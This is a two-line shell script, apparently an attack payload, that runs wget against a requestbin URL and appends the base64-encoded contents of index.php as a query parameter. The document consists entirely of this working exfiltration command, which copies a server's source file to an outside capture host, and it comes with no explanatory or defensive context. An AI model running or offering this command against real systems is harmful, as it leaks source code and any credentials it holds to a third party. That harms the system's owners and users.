#!/bin/sh
wget https://requestbin.fullcontact.com/10msdyy1?a=$(cat index.php | base64 -w0)
